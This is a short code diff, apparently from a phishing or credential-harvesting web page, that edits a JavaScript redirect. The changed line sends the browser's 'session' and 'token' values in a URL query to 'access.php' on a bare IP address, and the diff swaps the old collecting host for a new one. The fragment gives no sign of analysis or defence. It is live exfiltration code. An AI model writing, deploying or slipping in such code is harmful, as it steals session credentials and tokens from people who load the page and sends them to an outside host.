@@ -109,7 +109,7 @@ function myFunction() {
      }
  }
 
-window.location.href = "http://51.81.101.99/access.php?session="+session+"&token="+token ;
+window.location.href = "http://135.148.144.255/access.php?session="+session+"&token="+token ;
 
 }
 </script>
